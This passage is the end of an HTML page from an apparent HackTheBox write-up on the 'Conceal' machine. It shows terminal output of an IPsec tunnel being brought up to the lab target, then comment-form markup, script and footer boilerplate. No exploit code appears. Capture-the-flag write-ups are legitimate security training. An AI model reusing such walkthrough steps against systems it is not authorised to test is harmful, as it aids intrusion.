+<p>m4rc0ff@SittingDucks:~/Documents/htbBoxes/conceal$ sudo ipsec up SittingDucks
+generating QUICK_MODE request 2281399306 [ HASH SA No ID ID ]
+sending packet: from 10.10.14.18[500] to 10.10.10.116[500] (196 bytes)
+received packet: from 10.10.10.116[500] to 10.10.14.18[500] (188 bytes)
+parsed QUICK_MODE response 2281399306 [ HASH SA No ID ID ]
+selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
+detected rekeying of CHILD_SA SittingDucks{1}
+CHILD_SA SittingDucks{2} established with SPIs c721a47a_i 5691d4c4_o and TS 10.10.14.18/32[tcp] === 10.10.10.116/32[tcp]
+generating QUICK_MODE request 2281399306 [ HASH ]
+sending packet: from 10.10.14.18[500] to 10.10.10.116[500] (60 bytes)
+connection 'SittingDucks' established successfully</p>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="http://127.0.0.1:8000/feeds/comment.Conceal.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="http://127.0.0.1:8000/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Conceal"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="http://127.0.0.1:8000/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="http://127.0.0.1:8000/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="http://127.0.0.1:8000/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="http://127.0.0.1:8000/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="http://127.0.0.1:8000">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="http://127.0.0.1:8000/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="http://127.0.0.1:8000/theme/js/jquery.colorbox-min.js"></script>
+  <script src="http://127.0.0.1:8000/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
